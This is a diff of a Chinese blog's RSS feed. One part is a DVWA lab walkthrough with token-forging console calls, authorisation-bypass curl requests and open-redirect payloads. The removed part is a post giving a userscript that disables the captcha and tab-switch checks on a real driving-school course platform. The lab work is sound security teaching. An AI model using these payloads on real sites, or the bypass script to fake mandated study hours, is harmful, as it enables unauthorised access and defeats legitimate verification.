+&lt;p&gt;&lt;strong&gt;攻击者的目标是：&lt;/strong&gt;成功提交 &lt;code&gt;success&lt;/code&gt; 这个单词，并通过哈希验证。&lt;/p&gt;
+&lt;h3&gt;Low：内联脚本&lt;/h3&gt;
+&lt;p&gt;如果直接提交 &lt;code&gt;success&lt;/code&gt; 会提示 Invalid token。显然，表单里有个隐藏的 token。&lt;/p&gt;
+&lt;p&gt;‍查看 HTML，能找到表单后的一段 script：&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;function rot13(inp) {
+  return inp.replace(/[a-zA-Z]/g,function(c){return String.fromCharCode((c&amp;lt;=&amp;quot;Z&amp;quot;?90:122)&amp;gt;=(c=c.charCodeAt(0)+13)?c:c-26);});
+}
+
+function generate_token() {
+  var phrase = document.getElementById(&amp;quot;phrase&amp;quot;).value;
+  document.getElementById(&amp;quot;token&amp;quot;).value = md5(rot13(phrase));
+}
+
+generate_token();
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;当页面打开时，该脚本将输入框中的内容通过某种方式算出 MD5 作为 token。可以猜到，后端肯定是检查了 token 和 phase 是否匹配。然而当页面刚加载时 phase 是 &lt;code&gt;ChangeMe&lt;/code&gt;，除非直接提交 &lt;code&gt;ChangeMe&lt;/code&gt;，其他任何 phase 都会显示 Invalid token。&lt;/p&gt;
+&lt;p&gt;既然前端代码都能看见了，对 &lt;code&gt;success&lt;/code&gt; 这个 phase 也用这种方式计算出其 MD5 就行了。其实，只要输入 &lt;code&gt;success&lt;/code&gt;，然后在 console 里调用 &lt;code&gt;generate_token()&lt;/code&gt;，就会计算出对应的 token，提交即可。&lt;/p&gt;
+&lt;h3&gt;Medium：外部脚本，简单混淆&lt;/h3&gt;
+&lt;p&gt;和 low 的区别在于：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;不在 HTML 中内联 JavaScript，而是加载外部的 js 文件。&lt;/li&gt;
+&lt;li&gt;JavaScript 脚本做了简单的混淆，所有函数名、变量名都用了和代码含义无关的命名。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;function do_something(e) {
+    for (var t = &amp;quot;&amp;quot;, n = e.length - 1; n &amp;gt;= 0; n--)
+        t += e[n];
+    return t
+}
+setTimeout(function() {
+    do_elsesomething(&amp;quot;XX&amp;quot;)
+}, 300);
+function do_elsesomething(e) {
+    document.getElementById(&amp;quot;token&amp;quot;).value = do_something(e + document.getElementById(&amp;quot;phrase&amp;quot;).value + &amp;quot;XX&amp;quot;)
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;好在混淆后的代码也并不难懂，页面加载后延时 300ms 调用 &lt;code&gt;do_elsesomething&lt;/code&gt; 函数计算 token。我们仍然只要输入 &lt;code&gt;success&lt;/code&gt; 后在 console 里调用 &lt;code&gt;do_elsesomething(&amp;quot;XX&amp;quot;)&lt;/code&gt; 再提交即可。&lt;/p&gt;
+&lt;h3&gt;High：高级混淆&lt;/h3&gt;
+&lt;p&gt;和 medium 相比，这次代码做了充分的混淆，使代码几乎不可读。仔细观察，这段代码里用了 &lt;code&gt;eval&lt;/code&gt; 函数。代码&lt;strong&gt;先构造出要执行的 JavaScript 代码&lt;/strong&gt;，然后使用 &lt;code&gt;eval&lt;/code&gt; 执行。&lt;/p&gt;
+&lt;p&gt;既然构造出的代码要被执行，那能不能被我们看到呢？答案是肯定的。&lt;/p&gt;
+&lt;p&gt;在 F12 里选中 Submit 按钮，可以看到其 click 事件绑定了一个函数，这个函数来源于 VM8084:1：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://blog.skywt.cn/usr/uploads/2024/05/4124032546.png&quot; alt=&quot;F12 console 里看到的事件绑定&quot;&gt;&lt;/p&gt;
+&lt;p&gt;这个 VM 指的是 V8 引擎为&lt;strong&gt;没有对应来源的 JavaScript&lt;/strong&gt; 创造的虚拟机环境。对于有对应来源的脚本，这个地方本来会显示源文件地址。&lt;/p&gt;
+&lt;p&gt;进入这个 VM8084:1，就能看到脚本构造出的可读 JavaScript 代码。看来，之前的代码混淆相当于没有作用了。&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;document.getElementById(&amp;quot;phrase&amp;quot;).value = &amp;quot;&amp;quot;;
+setTimeout(function() {
+    token_part_2(&amp;quot;XX&amp;quot;)
+}, 300);
+document.getElementById(&amp;quot;send&amp;quot;).addEventListener(&amp;quot;click&amp;quot;, token_part_3);
+token_part_1(&amp;quot;ABCD&amp;quot;, 44);
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;显然，代码按照顺序调用了三个 &lt;code&gt;token_part&lt;/code&gt; 函数。我们也仿照这个流程进行即可。&lt;/p&gt;
+&lt;p&gt;将输入框中内容改为 &lt;code&gt;success&lt;/code&gt;，然后在 console 中调用：&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;token_part_1(&amp;quot;ABCD&amp;quot;, 44);
+token_part_2(&amp;quot;XX&amp;quot;);
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;然后点击 Submit（绑定的 Event Listener 会调用 &lt;code&gt;token_part_3&lt;/code&gt;），就能完成提交。&lt;/p&gt;
+&lt;h3&gt;Impossible：不要相信前端发来的任何数据&lt;/h3&gt;
+&lt;blockquote&gt;
+&lt;p&gt;You can never trust anything that comes from the user or prevent them from messing with it and so there is no impossible level.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;永远不要相信前端发来的任何数据，不管在前端用了怎样的 JavaScript 处理。对于这个问题，没有 impossible 的解决方案。&lt;/p&gt;
+&lt;h2&gt;Authorisation Bypass&lt;/h2&gt;
+&lt;p&gt;在这关里，提供了一个用户管理列表，但是只有管理员用户 admin 可以访问。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;攻击者的目标是：&lt;/strong&gt;作为非管理员用户，实现用户管理的功能。&lt;/p&gt;
+&lt;p&gt;完成这关时，必须以非管理员用户登录 DVWA，例如名为 gordonb（密码 abc123）的用户。&lt;/p&gt;
+&lt;h3&gt;Low：无防护&lt;/h3&gt;
+&lt;p&gt;通过 gordonb 用户登录，会发现左侧 Authorisation Bypass 这一关消失了。&lt;/p&gt;
+&lt;p&gt;然而，不难发现每一关对应一个子路径。依然可以通过这个 URL 进入用户管理：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;http://localhost/vulnerabilities/authbypass/
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;没有做任何的鉴权，只要进入页面就有修改编辑用户的权限。&lt;/p&gt;
+&lt;h3&gt;Medium：UI 不让进，接口还能用&lt;/h3&gt;
+&lt;p&gt;通过 low 的方式，可以发现进不去这一关了，提示「Unauthorised」。&lt;/p&gt;
+&lt;p&gt;然而，我们还是可以先研究研究这关的源码，在这个地址：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;http://localhost/vulnerabilities/view_source.php?id=authbypass&amp;amp;security=medium
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code class=&quot;language-php&quot;&gt;
+&amp;lt;?php
+/*
+
+Only the admin user is allowed to access this page.
+
+Have a look at these two files for possible vulnerabilities: 
+
+* vulnerabilities/authbypass/get_user_data.php
+* vulnerabilities/authbypass/change_user_details.php
+
+*/
+
+if (dvwaCurrentUser() != &amp;quot;admin&amp;quot;) {
+    print &amp;quot;Unauthorised&amp;quot;;
+    http_response_code(403);
+    exit;
+}
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;看起来这个页面是进不去了。根据提示，可以发现通过 &lt;code&gt;get_user_data.php&lt;/code&gt; 文件还是可以获取用户信息，访问下面这个 URL 能获取所有用户信息的 JSON：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;http://localhost/vulnerabilities/authbypass/get_user_data.php
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;也就是说没有做接口的鉴权，只做了 UI 的鉴权。&lt;/p&gt;
+&lt;p&gt;同样地，可以通过 &lt;code&gt;change_user_details.php&lt;/code&gt; 更新用户信息：&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;curl &apos;http://localhost/vulnerabilities/authbypass/change_user_details.php&apos; \
+  -H &apos;Accept: application/json&apos; \
+  -H &apos;Content-Type: application/json&apos; \
+  -H &apos;Cookie: _pk_id.1.1fff=83ca368cc934da2a.1713256286.; security=medium; PHPSESSID=0fd302cffc8f3d6e7cc65f176c4f556c&apos; \
+  -H &apos;Origin: http://localhost&apos; \
+  --data-raw &apos;{&amp;quot;id&amp;quot;:2,&amp;quot;first_name&amp;quot;:&amp;quot;Gordon&amp;quot;,&amp;quot;surname&amp;quot;:&amp;quot;Brown1&amp;quot;}&apos;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;通过这两个接口，虽然进不去管理员 UI，但是能获得相同的功能。&lt;/p&gt;
+&lt;h3&gt;High：修改接口仍可用&lt;/h3&gt;
+&lt;p&gt;和 medium 相比，&lt;code&gt;get_user_data.php&lt;/code&gt; 做了鉴权，但是 &lt;code&gt;change_user_details.php&lt;/code&gt; 没有。&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;curl &apos;http://localhost/vulnerabilities/authbypass/change_user_details.php&apos; \
+  -H &apos;Accept: application/json&apos; \
+  -H &apos;Content-Type: application/json&apos; \
+  -H &apos;Cookie: _pk_id.1.1fff=83ca368cc934da2a.1713256286.; security=high; PHPSESSID=0fd302cffc8f3d6e7cc65f176c4f556c&apos; \
+  -H &apos;Origin: http://localhost&apos; \
+  --data-raw &apos;{&amp;quot;id&amp;quot;:2,&amp;quot;first_name&amp;quot;:&amp;quot;Gordon&amp;quot;,&amp;quot;surname&amp;quot;:&amp;quot;Brown2&amp;quot;}&apos;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;这个等级想要模拟的是愚蠢的开发者漏掉了这个接口的鉴权。&lt;/p&gt;
+&lt;h3&gt;Impossible：全部鉴权&lt;/h3&gt;
+&lt;p&gt;对 &lt;code&gt;change_user_details.php&lt;/code&gt; 文件也加上鉴权。至此所有页面、接口都需要认证才能使用了。&lt;/p&gt;
+&lt;h2&gt;Open HTTP Redirect&lt;/h2&gt;
+&lt;p&gt;这一关里，给出的 URL 中通过给指定页面的参数，让页面为我们重定向。该情境的本意是只能重定向到指定的两个页面。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;攻击者的目标：&lt;/strong&gt;使之重定向到任何我们想要的页面。&lt;/p&gt;
+&lt;h3&gt;Low：直接重定向&lt;/h3&gt;
+&lt;p&gt;无脑将 &lt;code&gt;redirect&lt;/code&gt; 参数作为 &lt;code&gt;location.href&lt;/code&gt; 的值。可以重定向到任何网站：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;http://localhost/vulnerabilities/open_redirect/source/low.php?redirect=https://www.baidu.com
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3&gt;Medium：不能含有协议名&lt;/h3&gt;
+&lt;p&gt;判断目标 URL 中是否包含 &lt;code&gt;http://&lt;/code&gt; 或者 &lt;code&gt;https://&lt;/code&gt;，如果包含则拒绝重定向。&lt;/p&gt;
+&lt;p&gt;表示 URL 时，如果没有明确指定协议，直接以 &lt;code&gt;//&lt;/code&gt; 开头，则表示使用和当前页面相同的协议。现在绝大部分网站又都支持将 HTTP 重定向到 HTTPS。所以，只需要：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;http://localhost/vulnerabilities/open_redirect/source/medium.php?redirect=//www.baidu.com
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3&gt;High：必须包含子串&lt;/h3&gt;
+&lt;p&gt;目标 URL 中必须包含 &lt;code&gt;info.php&lt;/code&gt; 这个子串，否则拒绝重定向。&lt;/p&gt;
+&lt;p&gt;这也很好绕过，最简洁的方式就是加一个没用的 param：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;http://localhost/vulnerabilities/open_redirect/source/high.php?redirect=https://www.baidu.com?a=info.php
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3&gt;Impossible：白名单&lt;/h3&gt;
+&lt;p&gt;最终，最安全的方式还是白名单。这一等级直接判断目标是 &lt;code&gt;info.php?id=1&lt;/code&gt; 或者 &lt;code&gt;info.php?id=2&lt;/code&gt;，其他一概拒绝。&lt;/p&gt;
+&lt;h2&gt;总结：Web 安全的一些最佳实践&lt;/h2&gt;
+&lt;p&gt;根据以上漏洞的尝试和探索，可以得出这些 Web 安全的最佳实践：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;白名单比黑名单更安全。&lt;/li&gt;
+&lt;li&gt;不要相信前端发来的任何数据。&lt;/li&gt;
+&lt;li&gt;不要在 HTML 或 SQL 里插入没有转义过的 string。&lt;/li&gt;
+&lt;li&gt;不想让用户知道的处理逻辑，就放到后端。不要尝试在前端「隐藏代码」，这是不可能的。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;开发 Web 应用过程中可能有无数的坑，而踩到了安全方面的坑则特别可能带来极大的损失。最重要的是，在设计和开发的过程中要有充分的&lt;strong&gt;安全意识&lt;/strong&gt;，避免各种形式的不良实践。&lt;/p&gt;
+</content:encoded><author>me@skywt.cn</author></item><item><title>✨ 二十一岁，繁花盛开。</title><link>https://skywt.cn/blog/twenty-one-years-old/</link><guid isPermaLink="true">https://skywt.cn/blog/twenty-one-years-old/</guid><description>二十一岁了，到了小时候觉得很遥远的年纪。
 
 </description><pubDate>Sun, 07 Apr 2024 07:17:00 GMT</pubDate><content:encoded>&lt;p&gt;二十一岁了，到了小时候觉得很遥远的年纪。&lt;/p&gt;
 &lt;p&gt;不知道是什么时候形成的习惯，每年生日都会发一篇博客，纪念这一岁的自己。翻到以往生日发的博客，更加能感叹时光之流逝，自己的成长。对于二十一岁，我还一点都没有准备好。&lt;/p&gt;
@@ -3953,281 +4623,6 @@ A user who loves Lingo&lt;/p&gt;
 &lt;p&gt;Upd：本文发布前夕，MacWk 已经关站了。非常可惜。&lt;/p&gt;
 &lt;h2&gt;展望&lt;/h2&gt;
 &lt;p&gt;希望日后能有自己逆向、研究、破解的实力。还是好好学习吧 =_=&lt;/p&gt;
-</content:encoded><author>me@skywt.cn</author></item><item><title>「无忧乐行」切后台检测、随机验证码屏蔽方案</title><link>https://skywt.cn/blog/shielding-solution-for-5u/</link><guid isPermaLink="true">https://skywt.cn/blog/shielding-solution-for-5u/</guid><description>学车学到科目三，要我们在[无忧乐行](https://5u5u5u5u.com/)平台上看满 9 小时课程之后才能预约考试。这个平台非常恶心，不仅 UI 丑得没法看，而且在看视频的时候每隔一定时间会弹出验证码窗口，必须在指定时间之内完成验证；把网站标签页或窗口切到后台就会停止记录学时，必须保证前台观看。
-
-魔高一尺，道高一丈，既然都是前端的小把戏，我们自然可以找到前端的解决方法。
-
-</description><pubDate>Sun, 10 Jul 2022 15:35:00 GMT</pubDate><content:encoded>&lt;p&gt;学车学到科目三，要我们在&lt;a href=&quot;https://5u5u5u5u.com/&quot;&gt;无忧乐行&lt;/a&gt;平台上看满 9 小时课程之后才能预约考试。这个平台非常恶心，不仅 UI 丑得没法看，而且在看视频的时候每隔一定时间会弹出验证码窗口，必须在指定时间之内完成验证；把网站标签页或窗口切到后台就会停止记录学时，必须保证前台观看。&lt;/p&gt;
-&lt;p&gt;魔高一尺，道高一丈，既然都是前端的小把戏，我们自然可以找到前端的解决方法。&lt;/p&gt;
-&lt;h2&gt;TL；DR&lt;/h2&gt;
-&lt;p&gt;最终解决方案非常简单，就三行代码……&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;window.inspect = function(){};
-$(document).off(&apos;hide&apos;);
-$(document).off(&apos;visibilitychange&apos;);
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;估计这是最简单的方案了。看到这里的你是不是有点智商被侮辱的感觉 😅……&lt;/p&gt;
-&lt;p&gt;已经上传 Greasy Fork 啦：&lt;a href=&quot;https://greasyfork.org/zh-CN/scripts/447680-%E6%97%A0%E5%BF%A7%E4%B9%90%E8%A1%8C%E5%88%B7%E5%AD%A6%E6%97%B6&quot;&gt;无忧乐行刷学时&lt;/a&gt;。虽然这么简单可能没啥必要上传……&lt;/p&gt;
-&lt;p&gt;以下记录一下对这个网页的探索过程。&lt;/p&gt;
-&lt;h2&gt;现存其他方案&lt;/h2&gt;
-&lt;p&gt;最开始在 Greasy Fork 上找了一下，比较有用的是这个脚本：&lt;a href=&quot;https://greasyfork.org/zh-CN/scripts/395005-%E5%88%B7%E5%AD%A6%E6%97%B6-%E6%9D%AD%E5%B7%9E%E7%A7%91%E7%9B%AE%E9%A9%BE%E9%A9%B6%E5%9F%B9%E8%AE%AD%E7%BD%91%E7%BB%9C%E8%AF%BE%E7%A8%8B&quot;&gt;【刷学时】杭州科目驾驶培训网络课程&lt;/a&gt;。它的功能是「在任意切换窗口、浏览其他页面时会自动计时；如果有验证弹窗，发送桌面通知」。&lt;/p&gt;
-&lt;p&gt;然而在我使用的时候，时不时的弹窗验证通知还是让人非常不爽，而且这个脚本屏蔽「切换窗口停止计时」的手段好像是高频率地检测，这样会导致记录的学时少于实际的时间。总之不太理想。&lt;/p&gt;
-&lt;p&gt;于是晚上就开始研究了一下这个网站……&lt;/p&gt;
-&lt;h2&gt;网站技术初探&lt;/h2&gt;
-&lt;p&gt;这个网站后端是 JSP，估计是很 low 的外包公司，主要业务逻辑的 JS 代码都内联在 HTML 里。还有诸如 &lt;code&gt;FuckInternetExplorer&lt;/code&gt; 这样的暴躁函数名（这搁 NOI 不得被禁赛几年）（虽然 IE 确实 👎），甚至锁进混用 Tab 和空格！&lt;/p&gt;
-&lt;p&gt;前端用了 jQuery，代码可以说非常杂乱（好在留了注释）。我以为这垃圾网站估计是十年前的，没想到代码里记录的最近更新日期是 2021-6-1……&lt;/p&gt;
-&lt;h2&gt;探索「模拟请求」的方案&lt;/h2&gt;
-&lt;p&gt;这种方法的探索失败了（或者说由于过于麻烦而放弃了）。可以跳过不看。&lt;/p&gt;
-&lt;p&gt;由于大量的业务逻辑放在前端，一开始我尝试研究了一下直接用前端发请求计学时的可能性。因为之前用过&lt;a href=&quot;https://greasyfork.org/zh-CN/scripts/443122-%E8%B6%85%E6%98%9F%E5%AD%A6%E4%B9%A0%E9%80%9A%E5%B0%8F%E5%8A%A9%E6%89%8B-%E8%A7%86%E9%A2%91%E4%B8%93%E7%89%88&quot;&gt;超星学习通小助手-视频专版&lt;/a&gt;这个脚本，这种直接发请求挂机的方式给我留下了深刻印象。&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;//签退 num为1时 强制  //随机验证
-var todayEnd;
-function signOut(type){
-    //判断是否在自动上传，如果在，则延后0.5S,防止同时进行后台自动屏蔽学时
-    if(!automaticUpload) {
-        //失败则跳转到课件列表页面
-        $(&amp;quot;.tt_p&amp;quot;).focus();
-        isInspect =true;
-        todayEnd=type;
-        suspend();
-        if(courseware.ruleDto.automatic == 1) {
-            validate(1,3);
-        }else {
-            interfaceForStu(3);   //签退记录
-        }
-    }else {
-        setTimeout(&amp;quot;signOut(&amp;quot;+type+&amp;quot;)&amp;quot;, 500);
-    }
-}
-
-//视频验证接口 num: 1-签到 2-中间验证 3-签退
-function interfaceForStu(num){
-    //获取验证方式
-        styleType = num;
-        // 20200728:视频验证是通过配置来选择走的海景还是云从，故这边代码无需改造
-        if(courseware.ruleDto.autoVerifyStyle==1){ //海景
-            //...
-        }else if(courseware.ruleDto.autoVerifyStyle==6){//2017.09.26 云从人脸识别
-            //...
-        }else if(courseware.ruleDto.autoVerifyStyle==3){ //回答问题
-            window.scrollTo(0,0);//滚动到顶部
-            page=$.layer({
-                //...
-                iframe : {
-                    src : &apos;https://5u5u5u5u.com:443/learning/popup/inspect_ques2.jsp?type=&apos;+num+&apos;&amp;amp;frequency=&apos;+courseware.ruleDto.verifyTimes+&apos;&amp;amp;time=&apos;+courseware.ruleDto.verifyValidTime+&apos;&amp;amp;verifyNotPassStyle=&apos;+courseware.ruleDto.verifyNotPassStyle+&apos;&amp;amp;timeoutStyle=&apos;+courseware.ruleDto.timeoutStyle+&apos;&amp;amp;resType=&apos;+courseware.resType
-                }
-            });
-        }else if(courseware.ruleDto.autoVerifyStyle==5) { //不用了
-            //...
-        }else if(courseware.ruleDto.autoVerifyStyle == 4) {   //拍照
-            //...
-        }
-}
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;code&gt;interfaceForStu&lt;/code&gt; 这个函数就是弹出点击验证码的。可以看到点击签退时，弹出了一个浮层，尝试构造一个 &lt;code&gt;src&lt;/code&gt; 去看看，比如 &lt;code&gt;https://5u5u5u5u.com:443/learning/popup/inspect_ques2.jsp?type=2&amp;amp;frequency=3&amp;amp;time=3&amp;amp;verifyNotPassStyle=1&amp;amp;timeoutStyle=1&amp;amp;resType=1&lt;/code&gt;。可以看到这个 iframe 内部的验证码页面：&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;https://blog.skywt.cn/usr/uploads/2022/07/3520133636.png&quot; alt=&quot;“无忧乐行”的验证码&quot;&gt;&lt;/p&gt;
-&lt;p&gt;形式是向后端请求一个图片，要求用户在指定时间内按照顺序用鼠标点击四个汉字的位置。&lt;/p&gt;
-&lt;p&gt;F12 审阅这个页面的代码。还是一样的风格，JS 内联在 HTML 里……（看第五行和第八行，一个 type 字段写了两遍，单双引号、空格风格还不统一…… 🤮）&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;//后台验证
-function InpectvalidateCode(result){
-    $.ajax({
-        url:&amp;quot;/learning_json/inpectvalidateCode.action&amp;quot;, //url需重定义
-        type : &amp;quot;post&amp;quot;,
-        data : &amp;quot;result=&amp;quot;+result,
-        async:false,
-        type:&apos;post&apos;,
-        success:function(json){
-            if(json.msg !=&amp;quot;success&amp;quot;){
-                nextInpect();
-            }else{
-                countFlag=false;
-                parent.validate(1,validateType,null, json.code);
-                try {
-                    window.parent.closeCur();
-                }catch(e) {
-                }
-            }
-        }
-    });
-}
-
-//获取点击位置
-function getSelPic() {
-    //...
-}
-
-$(function(){
-    //...
-    $(&amp;quot;.queding_btn&amp;quot;).click(function(){
-        countFlag = false;
-        var result = getSelPic();
-        InpectvalidateCode(result);
-    });
-    //...
-});
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;点击「确定」按钮后，向后端发送了用户点击的坐标，然后拿到了后端返回的一个 code，传给 &lt;code&gt;parent&lt;/code&gt;（也就是 iframe 外层的 document）的 &lt;code&gt;validate&lt;/code&gt; 函数，这个函数应该就是用来增加有效学时的。&lt;/p&gt;
-&lt;p&gt;回到视频播放页面：&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;//验证回调方法  validateType:1-签到  2-随机 3-中间验证
-function validate(result,validateType,image, code){
-    //...
-    if(validateType==1){
-        //...
-    }else if(validateType==3){
-        layer.closeAll();
-        var valid=getValidTime();
-        var newVideoTime=getVideoTime();
-        //...
-        $.ajax({
-            url:&amp;quot;/learning_json/signOut.action?ttm=&amp;quot; + (new Date()).getTime(),
-            async:false,
-            data:&amp;quot;id=&amp;quot;+courseware.id+&amp;quot;&amp;amp;result=&amp;quot;+result+&amp;quot;&amp;amp;videoTime=&amp;quot;+newVideoTime+&amp;quot;&amp;amp;valid=&amp;quot;+valid+&amp;quot;&amp;amp;type=&amp;quot;+todayEnd+&amp;quot;&amp;amp;lecturePage=&amp;quot;+pageNo+&amp;quot;&amp;amp;verifyType=&amp;quot;+courseware.ruleDto.autoVerifyStyle+&amp;quot;&amp;amp;stageId=&amp;quot;+stageId+&amp;quot;&amp;amp;photoUrl=&amp;quot;+image+&amp;quot;&amp;amp;stageEnd=&amp;quot;+stageEnd+&amp;quot;&amp;amp;tag=&amp;quot;+tag+&amp;quot;&amp;amp;code=&amp;quot;+code+&amp;quot;&amp;amp;videoid=&amp;quot;+videoid,
-            type:&amp;quot;post&amp;quot;,
-            success:function(json){
-                if(result==-1){
-                    faultMessage();
-                    return ;
-                }
-                if(json==&amp;quot;success&amp;quot;){
-                    endSucAlert();
-                }else if(json ){
-                    //入库失败
-                    //...
-                }else {
-                    toLessonList();
-                }
-
-            }
-        });
-    }else if(validateType==2){ //随机验证
-        var _flag = true;
-        var valid=getValidTime();
-        var newVideoTime=getVideoTime();
-        //同步方法 async:false,
-        $.ajax({
-            url:&amp;quot;/learning_json/inspect.action?ttm=&amp;quot; + (new Date()).getTime(),
-            async:false,
-            data:&amp;quot;id=&amp;quot;+courseware.id+&amp;quot;&amp;amp;result=&amp;quot;+result+&amp;quot;&amp;amp;videoTime=&amp;quot;+newVideoTime+&amp;quot;&amp;amp;valid=&amp;quot;+valid+&amp;quot;&amp;amp;lecturePage=&amp;quot;+pageNo+&amp;quot;&amp;amp;verifyType=&amp;quot;+courseware.ruleDto.autoVerifyStyle+&amp;quot;&amp;amp;stageId=&amp;quot;+stageId+&amp;quot;&amp;amp;photoUrl=&amp;quot;+image+&amp;quot;&amp;amp;stageEnd=&amp;quot;+stageEnd+&amp;quot;&amp;amp;tag=&amp;quot;+tag+&amp;quot;&amp;amp;code=&amp;quot;+code+&amp;quot;&amp;amp;videoid=&amp;quot;+videoid,
-            type:&amp;quot;post&amp;quot;,
-            success:function(json){
-                if(sucRedirect) {
-                    endSucAlert();
-                    return;
-                }
-                if(result==-1){
-                    faultMessage();
-                    return ;
-                }
-                if(json &amp;amp;&amp;amp; json !=&amp;quot;success&amp;quot;){
-                    //...
-                }
-            }
-        });
-        if(result==1 &amp;amp;&amp;amp; !sucRedirect &amp;amp;&amp;amp; _flag){//验证结果返回成功
-            curState = cast;
-            validTime=validTime+valid;//随机验证已经有效的学习时间
-            setRandomTime();
-            goon();
-        }
-
-    }
-    //...
-}
-
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;尝试修改 cast 变量，会发现右上角的计时器时间也会更改；假设改为 2 小时，点击签退，验证之后会发现弹窗显示「有效学时 2 小时」，然而进入课程列表刷新会发现实际更新的时间并不是 2 小时，而是实际进入页面的时间。&lt;/p&gt;
-&lt;p&gt;尝试了多种方式，用 BS 修改请求啥的，结果记录的时间永远是我实际打开视频页面的时间……看来后端有某种不太好搞的验证方式。暂时懒得研究了。&lt;/p&gt;
-&lt;h2&gt;屏蔽「随机验证码」&lt;/h2&gt;
-&lt;p&gt;接下来还是关注一下比较简单的前端 tricks 了。&lt;/p&gt;
-&lt;p&gt;首先是这个不定时弹出的「随机验证码」，可以找到这段代码：&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;//随机验证
-function inspect(){
-    if(!automaticUpload) {
-        $(&amp;quot;.tt_p&amp;quot;).focus();
-        inspectUpload = true;
-        isInspect =true;
-        suspend();
-        interfaceForStu(2);   //视频验证
-    }else {
-        setTimeout(&amp;quot;inspect()&amp;quot;, 500);
-    }
-}
-
-
-//显示计时时间
-function startCount(){
-    //只有讲义
-    if(courseware.type==2){
-        //...
-    }
-    //非讲义
-    //alert(flag);
-    if(flag){
-        if(courseware.type!=2){
-        //按消耗时间计时
-        if(courseware.recordType==3){
-            operation(cast);
-            setStuTime(cast);
-            if(courseware.ruleDto.autoVerify==1)
-                if(randomTime==cast&amp;amp;&amp;amp;flag&amp;amp;&amp;amp;!endFlag){
-                    inspect();
-                }else if(randomTime&amp;amp;&amp;amp;randomTime&amp;lt;cast){
-                    setRandomTime();
-                }
-            if(courseware.ruleDto.autoVerify==3){
-                if(randomTime==cast&amp;amp;&amp;amp;flag&amp;amp;&amp;amp;!endFlag&amp;amp;&amp;amp;!validone){
-                    inspect();
-                    validone=true;
-                }else if(randomTime&amp;amp;&amp;amp;randomTime&amp;lt;cast){
-                    setRandomTime();
-                }
-            }
-            if(courseware.ruleDto.autoVerify==2){
-                if(validonetime&amp;gt;73 &amp;amp;&amp;amp; !validone){
-                    inspect();
-                    validone=true;
-                }else {
-                    validonetime++;
-                }
-            }
-        }else if(courseware.recordType==2){
-            //...
-        }else if(courseware.recordType==1){
-            //...
-            }
-        }
-    }
-    //...
-     ds = window.setTimeout(function(){startCount();},1000);
-}
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;看来这是个周期函数。如果 &lt;code&gt;cast&lt;/code&gt;（学时）达到 &lt;code&gt;randomTime&lt;/code&gt; 就调用 &lt;code&gt;inspect()&lt;/code&gt; 进行验证。经过实测 &lt;code&gt;flag&lt;/code&gt; 变量如果为 &lt;code&gt;false&lt;/code&gt; 则不会再计时……&lt;/p&gt;
-&lt;p&gt;那么，我们直接把 &lt;code&gt;inspect()&lt;/code&gt; 函数弄成空，让它什么都不做不就好了。也就是：&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;window.inspect = function(){};
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;（足够简单粗暴……）&lt;/p&gt;
-&lt;h2&gt;屏蔽「切后台检测」&lt;/h2&gt;
-&lt;p&gt;继续看代码，发现这一段：&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;//笔记  评价  窗口最小化暂停视频播放
-$(function(){
-     $(&apos;.xubox_close&apos;).css(&apos;display&apos;,&apos;none&apos;);
-    //最小化窗口暂停视频播放
-    $(document).on(&apos;hide&apos;, function() {
-        //...
-        layer.alert(&apos;您已离开当前页面,计时停止.&apos;, 8,function(index){
-            //...
-        });
-    });
-});
-&lt;/code&gt;&lt;/pre&gt;
